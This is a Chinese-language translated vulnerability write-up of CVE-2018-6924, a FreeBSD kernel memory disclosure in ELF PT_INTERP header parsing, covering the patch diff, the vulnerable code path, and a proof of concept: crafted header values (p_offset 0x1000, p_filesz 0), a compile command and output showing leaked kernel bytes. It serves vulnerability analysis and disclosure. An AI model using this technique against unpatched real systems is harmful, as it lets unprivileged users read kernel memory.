**在FreeBSD-SA-18:12这份安全公告中，FreeBSD修复了一个内核内存泄漏漏洞，该漏洞会影响相关操作系统的所有版本。这个漏洞就是这篇文章的主人公：漏洞CVE-2018-6924，由于FreeBSD内核在解析代码指向的ELF头时，缺少有效验证，此时的本地非特权用户就可以利用该漏洞查看内核内存的数据了。**

![](https://image.3001.net/images/20190904/1567528801_5d6e976118288.jpg!small)

##  漏洞补丁分析

跟往常一样，安全公告中包含了补丁源码的[链接](https://security.freebsd.org/patches/SA-18:12/elf.patch)，我们先来看一看相关的补丁代码：

    
    
    ---sys/kern/imgact_elf.c.orig
    
        +++sys/kern/imgact_elf.c
    
        @@-839,7 +839,8 @@
    
                    break;
    
                case PT_INTERP:
    
                    /* Path to interpreter */
    
        -                   if (phdr[i].p_filesz >MAXPATHLEN) {
    
        +                   if (phdr[i].p_filesz < 2||
    
        +                       phdr[i].p_filesz >MAXPATHLEN) {
    
                        uprintf("InvalidPT_INTERP\n");
    
                        error = ENOEXEC;
    
                        goto ret;
    
        @@-870,6 +871,11 @@
    
                    } else {
    
                        interp = __DECONST(char *,imgp->image_header) +
    
                            phdr[i].p_offset;
    
        +                           if(interp[interp_name_len - 1] != '\0') {
    
        +                                  uprintf("Invalid PT_INTERP\n");
    
        +                                   error =ENOEXEC;
    
        +                                   goto ret;
    
        +                           }
    
                    }
    
                    break;
    
                case PT_GNU_STACK:
    
        ---sys/kern/vfs_vnops.c.orig
    
        +++sys/kern/vfs_vnops.c
    
        @@-528,6 +528,8 @@
    
            struct vn_io_fault_args args;
    
            int error, lock_flags;
    
        +   if (offset < 0 && vp->v_type!= VCHR)
    
        +           return (EINVAL);
    
            auio.uio_iov = &ampaiov
    
            auio.uio_iovcnt = 1;
    
        aiov.iov_base = base;

这里有两处修改：sys/kern/imgact_elf.c和sys/kern/vfs_vnops.c。sys/kern/imgact_elf.c文件中包含了内核用于解析执行代码ELF头的代码，修复后的函数如下：

    
    
    776 static int
    
        777 __CONCAT(exec_, __elfN(imgact))(struct image_params *imgp)
    
        778  {
    
               [...]

受影响函数的名称是由__CONCAT和__elfN macros.
__CONCAT生成的，它由这两个参数组成，__elfN在[sys/sys/elf_generic.h](https://svnweb.freebsd.org/base/release/11.2.0/sys/sys/elf_generic.h?revision=335563&view=markup#l53)中定义：

函数名__CONCAT(exec_, __elfN(imgact))可以扩展成exec_elf32_imgact或
exec_elf64_imgact，具体取决于__ELF_WORD_SIZE定义为32还是64。但是在查看sys/kern/源目录后，我们可以看到两个名叫imgact_elf32.c和imgact_elf64.c的小型文件，它们负责给__ELF_WORD_SIZE定义适当的值，然后引入存在漏洞的文件kern/imgact_elf.c。此时，内核会包含两个版本的sys/kern/imgact_elf.c（中的函数），而这些函数名都是使用__elfN宏来构建的：其中一个版本负责处理32位ELF代码，另一个版本负责处理64位版本的ELF文件。

###  imgact_elf32.c:

    
    
    #define__ELF_WORD_SIZE 32
    
        #include<kern/imgact_elf.c>

###  imgact_elf64.c:

    
    
    #define__ELF_WORD_SIZE 64
    
        #include<kern/imgact_elf.c>

回到补丁代码上，很明显问题出在处理ELF文件的PT_INTERP程序头上：

    
    
    static int
    
        __CONCAT(exec_,__elfN(imgact))(struct image_params *imgp)
    
        {
    
            [...]
    
            for (i = 0; i < hdr->e_phnum; i++) {
    
                switch (phdr[i].p_type) {
    
                [...]
    
                case PT_INTERP:
    
                    /* Path to interpreter */
    
                    if (phdr[i].p_filesz >MAXPATHLEN) {
    
                        uprintf("InvalidPT_INTERP\n");
    
                        error = ENOEXEC;
    
                        goto ret;
    
                    }
    
                    [...]

PT_INTERP程序头包含程序解析器的路径名称，它只对于可执行文件才有意义，PT_INTERP程序头指向可执行文件时使用的是动态链接，并负责给动态链接的可执行程序加载所需的共享库。一般来说，FreeBSD的程序解析器会在[/libexec/ld-elf.so.1](https://www.freebsd.org/cgi/man.cgi?query=ld-elf.so)中设置。

下面给出的是一个针对32位ELF文件的特殊版本Elf_Phdr结构体：

    
    
    typedef struct {
    
            Elf32_Word      p_type;         /* Entry type. */
    
            Elf32_Off       p_offset;       /* File offset of contents. */
    
            Elf32_Addr      p_vaddr;        /* Virtual address in memory image. */
    
            Elf32_Addr      p_paddr;        /* Physical address (not used). */
    
            Elf32_Word      p_filesz;       /* Size of contents in file. */
    
            Elf32_Word      p_memsz;        /* Size of contents in memory. */
    
            Elf32_Word      p_flags;        /* Access permission flags. */
    
            Elf32_Word      p_align;        /* Alignment in memory and file. */
    
        }Elf32_Phdr;

旧版本代码只会检测“if phdr[i].p_filesz >
MAXPATHLEN”，如果条件判断为真，函数便会抛出ENOEXEC异常，而修复后的代码添加了额外的检测。

##  构建PoC

为了触发漏洞，我们需要让我们的ELF填充至一个单独的页面中，C伪代码如下：

    
    
    int main(int argc, char** argv){
    
            return argc;
    
        }

然后使用clang指令和-m32参数生成一个32位可执行程序，并添加-Oz-Wl和-s参数来让文件大小尽可能的小（不超过4096个字节）。

    
    
    % clang -Oz -Wl,-s -m32 test.c -o test

下面是我们构建的PT_INTERP相关代码：

    
    
    840                 case PT_INTERP:
    
        [...]
    
        852                         interp_name_len =phdr[i].p_filesz;
    
        853                         if (phdr[i].p_offset> PAGE_SIZE ||
    
        854                             interp_name_len> PAGE_SIZE - phdr[i].p_offset) {
    
        855                                VOP_UNLOCK(imgp->vp, 0);
    
        856                                 interp_buf =malloc(interp_name_len + 1, M_TEMP,
    
        857                                     M_WAITOK);
    
        858                                vn_lock(imgp->vp, LK_EXCLUSIVE | LK_RETRY);
    
        859                                 error =vn_rdwr(UIO_READ, imgp->vp, interp_buf,
    
        860                                    interp_name_len, phdr[i].p_offset,
    
        861                                    UIO_SYSSPACE, IO_NODELOCKED, td->td_ucred,
    
        862                                     NOCRED,NULL, td);
    
        863                                 if (error !=0) {
    
        864                                        uprintf("i/o error PT_INTERP\n");
    
        865                                         gotoret;
    
        866                                 }
    
        867                                interp_buf[interp_name_len] = '\0';
    
        868                                 interp = interp_buf;
    
        869                         } else {
    
        870                                 interp =__DECONST(char *, imgp->image_header) +
    
        871                                    phdr[i].p_offset;
    
        872                         }
    
        873                         break;

我们可以看到第853行和第854行，如果解析器路径字符串的文件偏移量位于第一个页面（phdr[i].p_offset >
PAGE_SIZE），或者解析器路径足够长到超出第一个页面（interp_name_len > PAGE_SIZE -phdr[i].p_offset），那么vn_rdwr()函数将会被调用，并读取ELF文件对应的vnode。

触发该漏洞的关键时p_offset成员不超过0x1000，并且解析器路径字符串的长度不会超过PAGE_SIZE -phdr[i].p_offset。那么触发该漏洞的关键就是，我们需要构造一个PT_INTERP程序头，并包含p_offset成员值0x1000，然后还要让p_filesz成员的值为0。我们这里使用了Kaitai
WebIDE来构建了我们所需的东西：

![](https://image.3001.net/images/20190904/1567528895_5d6e97bf6a030.png!small)

![](https://image.3001.net/images/20190904/1567528899_5d6e97c3a8630.png!small)

##  披露内核数据

exec_elf32_imgact()函数会调用elf32_load_file()函数来加载解释器，目标文件名路径包含在interp变量中：

    
    
    1036                if (interp != NULL) {
    
        1037                        have_interp = FALSE;
    
        [...]
    
        1058                        if (!have_interp) {
    
        1059                                error =__elfN(load_file)(imgp->proc, interp, &addr,
    
        1060                                   &imgp->entry_addr, sv->sv_pagesize);
    
        1061                        }
    
        1062                        vn_lock(imgp->vp,LK_EXCLUSIVE | LK_RETRY);
    
        1063                        if (error != 0) {
    
        1064                               uprintf("ELF interpreter %s not found, error %d\n",
    
        1065                                    interp,error);
    
        1066                                goto ret;
    
        1067                        }

运行修改后的ELF文件后，我们可以看到它将会窃取内核内存中的内容：

    
    
    francisco@freebsd112:~% ./poc1
    
        ELFinterpreter Ø3¤ not found, error 2
    
        Abort
    
        francisco@freebsd112:~% ./poc1
    
        ELFinterpreter  not found, error 2
    
        Abort
    
        francisco@freebsd112:~% ./poc1
    
        ELFinterpreter $ûÿÿl not found, error 2
    
        Abort
    
        francisco@freebsd112:~% ./poc1
    
        ELFinterpreter ^?ELF^A^A^A  not found, error2
    
        Abort

##  获取不可打印的输出

下面的代码段可以利用该漏洞获取内核内存中75个字节的十六进制导出数据：

    
    
    francisco@freebsd112:~% script -q capture1 ./poc1
    
        ELFinterpreter ?^[(^[(?^[(?^[(^[(^Z(^Z(^Z(^Z(^[(17^[(5^[(^[(^[(^[(  not found, error 2
    
        francisco@freebsd112:~% hexdump -C capture1
    
        00000000  70 6f 63 31 3a 0d 0a 45  4c 46 20 69 6e 74 65 72  |poc1:..ELF inter|
    
        00000010  70 72 65 74 65 72 20 c5  83 5e 5b 28 cc 83 5e 5b  |preter ..^[(..^[|
    
        00000020  28 d4 83 5e 5b 28 dc 83  5e 5b 28 98 83 5e 5b 28  |(..^[(..^[(..^[(|
    
        00000030  d8 d1 5e 5a 28 e2 d1 5e  5a 28 fe e5 5e 5a 28 9c  |..^Z(..^Z(..^Z(.|
    
        00000040  bf 5e 5a 28 e3 83 5e 5b  28 31 37 5e 5b 28 35 ba  |.^Z(..^[(17^[(5.|
    
        00000050  5e 5b 28 e6 83 5e 5b 28  e9 83 5e 5b 28 f2 83 5e  |^[(..^[(..^[(..^|
    
        00000060  5b 28 20 6e 6f 74 20 66  6f 75 6e 64 2c 20 65 72  |[( not found, er|
    
        00000070  72 6f 72 20 32 0d 0a 70  6f 63 31 3a 20 73 69 67  |ror 2..poc1: sig|
    
        00000080  6e 61 6c 20 36 0d 0a                              |nal 6..|
    
        00000087

 *** 参考来源：[quarkslab](https://blog.quarkslab.com/cve-2018-6924-freebsd-elf-header-parsing-kernel-memory-disclosure.html)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

